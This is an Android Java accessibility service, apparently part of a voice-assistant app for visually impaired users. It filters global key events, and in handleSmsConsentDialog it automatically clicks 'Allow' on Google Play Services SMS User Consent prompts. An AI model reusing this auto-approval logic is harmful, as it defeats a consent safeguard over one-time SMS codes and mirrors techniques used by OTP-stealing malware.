package com.accessibility.voicecompanion;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.os.SystemClock;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

/**
 * Accessibility service for assisting visually impaired users with system dialogs
 * such as auto-approving Google Play Services SMS User Consent prompts, global
 * key event filtering for hardware ActionSafetyGuard confirmations, and on-demand
 * native app interactions.
 */
public class BackgroundVoiceService extends AccessibilityService {

    public interface KeyEventListener {
        boolean onGlobalKeyEvent(KeyEvent event);
    }

    private static volatile KeyEventListener activeKeyEventListener;
    private static volatile boolean userTriggeredSessionActive = false;
    private static volatile BackgroundVoiceService sharedServiceInstance;

    public static void setKeyEventListener(KeyEventListener listener) {
        activeKeyEventListener = listener;
    }

    public static KeyEventListener getKeyEventListener() {
        return activeKeyEventListener;
    }

    public static void setUserTriggeredSessionActive(boolean active) {
        userTriggeredSessionActive = active;
    }

    public static boolean isUserTriggeredSessionActive() {
        return userTriggeredSessionActive;
    }

    public static BackgroundVoiceService getSharedInstance() {
        return sharedServiceInstance;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        sharedServiceInstance = this;
        AccessibilityServiceInfo info = getServiceInfo();
        if (info == null) {
            info = new AccessibilityServiceInfo();
        }
        info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        info.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        setServiceInfo(info);
    }

    @Override
    public void onDestroy() {
        if (sharedServiceInstance == this) {
            sharedServiceInstance = null;
        }
        super.onDestroy();
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        if (event == null) return false;
        KeyEventListener listener = activeKeyEventListener;
        if (listener != null) {
            return listener.onGlobalKeyEvent(event);
        }
        return super.onKeyEvent(event);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        CharSequence pkgSeq = event.getPackageName();
        String pkg = pkgSeq != null ? pkgSeq.toString() : null;

        // Immediate abort for permanently blocked sensitive packages (banking/UPI)
        if (pkg != null && SharingConsent.isPackageBlocked(pkg)) {
            return;
        }

        // Bounded SMS User Consent auto-approval takes precedence for GMS prompts
        if (SmsOtpHelper.isAwaitingSmsConsent()) {
            if (handleSmsConsentDialog(event)) {
                return;
            }
        }

        // Zero Background Scraping: Ignore all other events unless an active user session is ongoing
        // and the package is explicitly allowed in SharingConsent
        if (!userTriggeredSessionActive) {
            return;
        }

        if (pkg != null && !SharingConsent.isPackageAllowed(pkg)) {
            return;
        }
    }

    public boolean handleSmsConsentDialog(AccessibilityEvent event) {
        CharSequence pkg = event.getPackageName();
        if (pkg != null && !pkg.toString().contains("com.google.android.gms")) {
            return false;
        }
        AccessibilityNodeInfo root = null;
        try {
            root = getRootInActiveWindow();
        } catch (Exception ignored) {}
        if (root == null) return false;
        try {
            // 1. Check by view ID for standard Play Services consent positive button
            List<AccessibilityNodeInfo> byId = root.findAccessibilityNodeInfosByViewId("com.google.android.gms:id/positive_button");
            if (byId != null && !byId.isEmpty()) {
                for (AccessibilityNodeInfo node : byId) {
                    if (clickNodeOrParent(node)) {
                        SmsOtpHelper.setAwaitingSmsConsent(false);
                        return true;
                    }
                }
            }

            // 2. Check by text "Allow" or "ALLOW"
            List<AccessibilityNodeInfo> byText = root.findAccessibilityNodeInfosByText("Allow");
            if (byText != null && !byText.isEmpty()) {
                for (AccessibilityNodeInfo node : byText) {
                    if (clickNodeOrParent(node)) {
                        SmsOtpHelper.setAwaitingSmsConsent(false);
                        return true;
                    }
                }
            }
        } finally {
            if (Build.VERSION.SDK_INT >= 30) {
                try {
                    root.recycle();
                } catch (Exception ignored) {}
            }
        }
        return false;
    }

    private static boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable() && node.isEnabled()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            try {
                if (parent.isClickable() && parent.isEnabled()) {
                    return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            } finally {
                parent.recycle();
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() { }
}
